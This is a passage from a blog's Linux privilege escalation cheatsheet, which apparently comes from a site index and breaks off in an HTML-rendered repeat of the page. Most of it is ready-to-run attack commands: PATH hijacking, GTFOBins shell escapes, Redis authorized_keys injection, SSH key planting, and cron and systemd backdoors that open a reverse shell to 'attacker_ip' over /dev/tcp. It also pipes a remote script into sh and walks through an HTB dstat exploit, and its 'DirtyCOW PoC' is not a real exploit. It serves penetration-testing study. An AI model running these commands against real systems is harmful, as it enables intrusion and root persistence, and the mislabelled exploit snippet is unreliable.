manipulation is possible export PATH=/tmp:$PATH # Or create binary with same name as allowed command cp /bin/bash /tmp/allowed_binary_name Kernel and System Exploits Kernel Version Checking # Kernel version uname -r cat /proc/version # Check for known kernel exploits searchsploit linux kernel $(uname -r) # Distribution-specific exploits lsb_release -a cat /etc/os-release Common Kernel Exploits # Dirty COW (CVE-2016-5195) # Affects Linux kernel versions 2.6.22 to 4.8.3 # DirtyCOW PoC echo \u0026#39;int main() { setuid(0); system(\u0026#34;/bin/bash\u0026#34;); return 0; }\u0026#39; \u0026gt; /tmp/cow.c gcc -o /tmp/cow /tmp/cow.c # Check for vulnerable kernel if [[ $(uname -r | cut -d. -f1-2) \u0026lt; \u0026#34;4.9\u0026#34; ]]; then echo \u0026#34;Potentially vulnerable to DirtyCOW\u0026#34; fi Container Escape Techniques Docker Container Detection # Check if running in container cat /proc/1/cgroup | grep docker ls -la /.dockerenv # Check for container runtime ps aux | grep -E \u0026#34;(docker|containerd|runc)\u0026#34; # Check capabilities /sbin/getcap -r / 2\u0026gt;/dev/null capsh --print Container Privilege Escalation # Check for privileged container cat /proc/self/status | grep Cap # Check for host filesystem mounts mount | grep -E \u0026#34;/(proc|sys|dev)\u0026#34; # Look for Docker socket find / -name \u0026#34;docker.sock\u0026#34; 2\u0026gt;/dev/null # Check for host processes visible ps aux | wc -l Network-Based Privilege Escalation Internal Network Discovery # Network interfaces ip addr show ifconfig -a # ARP table arp -a ip neigh show # Network connections ss -tulnp netstat -tulnp # Port scanning internal network for i in {1..254}; do ping -c 1 192.168.1.$i \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;192.168.1.$i is up\u0026#34;; done Service Exploitation # Check for internal services nmap -sT -O localhost ss -tlnp | grep LISTEN # Database connections mysql -u root -p psql -U postgres # Redis exploitation redis-cli CONFIG GET dir CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys SET crackit \u0026#34;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\u0026#34; SAVE Persistence Mechanisms SSH Key Injection # Generate SSH key pair ssh-keygen -t rsa -f /tmp/key # Add public key to authorized_keys echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\u0026#34; \u0026gt;\u0026gt; /home/user/.ssh/authorized_keys # Set proper permissions chmod 600 /root/.ssh/authorized_keys chmod 700 /root/.ssh Cron Job Backdoors # Add malicious cron job echo \u0026#34;* * * * * /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; /etc/crontab # User-specific cron crontab -e # Add: * * * * * /path/to/backdoor Service Backdoors # Create systemd service cat \u0026gt; /etc/systemd/system/backdoor.service \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; [Unit] Description=System Backdoor After=network.target [Service] Type=simple User=root ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/attacker_ip/port 0\u0026gt;\u0026amp;1\u0026#39; Restart=always [Install] WantedBy=multi-user.target EOF systemctl enable backdoor.service systemctl start backdoor.service Automated Enumeration Tools LinPEAS # Download and run LinPEAS curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Or transfer and run wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod +x linpeas.sh ./linpeas.sh LinEnum # Download LinEnum wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh LSE (Linux Smart Enumeration) # Download and run LSE wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh chmod +x lse.sh ./lse.sh -l1 # Level 1 checks ./lse.sh -l2 # Level 2 checks Real-World Example: Soccer HTB doas/dstat Initial Discovery # Found user can write to dstat plugin directory player@soccer:/usr/local/share$ find / -group player 2\u0026gt;/dev/null | grep -v \u0026#39;^/proc\\|^/run\\|^/sys\u0026#39; /usr/local/share/dstat # Check doas configuration player@soccer:~$ cat /usr/local/etc/doas.conf permit nopass player as root cmd /usr/bin/dstat # Check directory permissions player@soccer:/usr/local/share$ ls -la drwxrwx--- 2 root player 4096 Dec 12 2022 dstat Exploitation # Create malicious dstat plugin echo \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; /usr/local/share/dstat/dstat_exploit.py # Execute with doas doas /usr/bin/dstat --exploit # Alternative method using GTFOBins reference mkdir -p ~/.dstat echo \u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39; \u0026gt; ~/.dstat/dstat_exploit.py doas /usr/bin/dstat --exploit Prevention and Hardening Secure Configuration Practices # Proper doas configuration # Use specific commands only, avoid wildcards permit nopass user as root cmd /usr/bin/specific-binary arg1 arg2 # Secure sudo configuration # Avoid NOPASSWD where possible # Use command aliases for complex commands # Regularly audit sudo rules # File permission hardening # Remove world-writable permissions find / -type d -perm -002 -exec chmod o-w {} \\; find / -type f -perm -002 -exec chmod o-w {} \\; Monitoring and Detection # Monitor privilege escalation attempts auditctl -w /etc/passwd -p wa -k passwd_changes auditctl -w /etc/shadow -p wa -k shadow_changes auditctl -w /etc/sudoers -p wa -k sudo_changes # Log sudo/doas usage # Configure proper logging in /etc/sudoers or doas.conf # File integrity monitoring # Use tools like AIDE or Tripwire to monitor critical files Always ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/","summary":"\u003ch1 id=\"linux-privilege-escalation-cheatsheet\"\u003eLinux Privilege Escalation Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"initial-enumeration\"\u003eInitial Enumeration\u003c/h2\u003e\n\u003ch3 id=\"system-information\"\u003eSystem Information\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic system info\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euname -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/os-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/issue\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostname\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Current user context\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhoami\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egroups\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/passwd \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Environment variables\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprintenv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"user-and-group-enumeration\"\u003eUser and Group Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# List all users\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Users with login shells\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/passwd \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Current user privileges\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -user \u003cspan class=\"k\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"k\"\u003e)\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s1\"\u003e\u0026#39;^/proc\\|^/run\\|^/sys\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -group \u003cspan class=\"k\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"k\"\u003e)\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"s1\"\u003e\u0026#39;^/proc\\|^/run\\|^/sys\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for interesting group memberships\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egroups\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find files owned by current user\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -user \u003cspan class=\"k\"\u003e$(\u003c/span\u003eid -u\u003cspan class=\"k\"\u003e)\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -group \u003cspan class=\"k\"\u003e$(\u003c/span\u003eid -g\u003cspan class=\"k\"\u003e)\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"suid-and-sgid-analysis\"\u003eSUID and SGID Analysis\u003c/h2\u003e\n\u003ch3 id=\"finding-suidsgid-binaries\"\u003eFinding SUID/SGID Binaries\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find SUID binaries\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -perm -u\u003cspan class=\"o\"\u003e=\u003c/span\u003es -type f 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -perm -4000 -type f 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find SGID binaries\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -perm -g\u003cspan class=\"o\"\u003e=\u003c/span\u003es -type f 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -perm -2000 -type f 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find both SUID and SGID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -perm -u\u003cspan class=\"o\"\u003e=\u003c/span\u003es -o -perm -g\u003cspan class=\"o\"\u003e=\u003c/span\u003es -type f 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common SUID binaries to check\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/bin/passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/bin/sudo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/bin/su\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/bin/doas\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"gtfobins-exploitation\"\u003eGTFOBins Exploitation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check GTFOBins for binary exploitation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# https://gtfobins.github.io/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common exploitable SUID binaries:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - /usr/bin/find\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind . -exec /bin/sh -p \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e -quit\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - /usr/bin/vim\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evim -c \u003cspan class=\"s1\"\u003e\u0026#39;:!/bin/sh\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - /usr/bin/less\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eless /etc/profile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - /usr/bin/more\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emore /etc/profile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - /usr/bin/nmap (older versions)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap --interactive\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - /usr/bin/awk\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"doas-privilege-escalation\"\u003edoas Privilege Escalation\u003c/h2\u003e\n\u003ch3 id=\"doas-configuration-analysis\"\u003edoas Configuration Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find doas binary and configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name doas 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name doas.conf 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common doas locations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/bin/doas\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/etc/doas.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check doas configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /usr/local/etc/doas.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example vulnerable configuration:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# permit nopass player as root cmd /usr/bin/dstat\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"doas-exploitation-techniques\"\u003edoas Exploitation Techniques\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Basic doas command execution\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas /usr/bin/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check what commands are allowed\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas -n /usr/bin/dstat --help\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# If specific command is allowed, look for ways to abuse it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example: dstat with custom plugins\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# doas with dstat privilege escalation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 1. Check if you can write to dstat plugin directory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -group \u003cspan class=\"k\"\u003e$(\u003c/span\u003eid -g\u003cspan class=\"k\"\u003e)\u003c/span\u003e 2\u0026gt;/dev/null \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /usr/local/share/dstat\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 2. Create malicious dstat plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;import os; os.execv(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;sh\u0026#34;])\u0026#39;\u003c/span\u003e \u0026gt; /usr/local/share/dstat/dstat_exploit.py\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 3. Execute with doas\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas /usr/bin/dstat --exploit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"doas-vs-sudo-differences\"\u003edoas vs sudo Differences\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# doas syntax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# doas with specific user\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edoas -u root \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check doas configuration syntax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# permit [options] identity [as target] [cmd command [args ...]]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Common doas misconfigurations:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - permit nopass user as root cmd /path/to/binary\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Allowing commands that can spawn shells\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Wildcard permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"sudo-privilege-escalation\"\u003esudo Privilege Escalation\u003c/h2\u003e\n\u003ch3 id=\"sudo-enumeration\"\u003esudo Enumeration\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check sudo privileges\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check sudo version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo --version\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 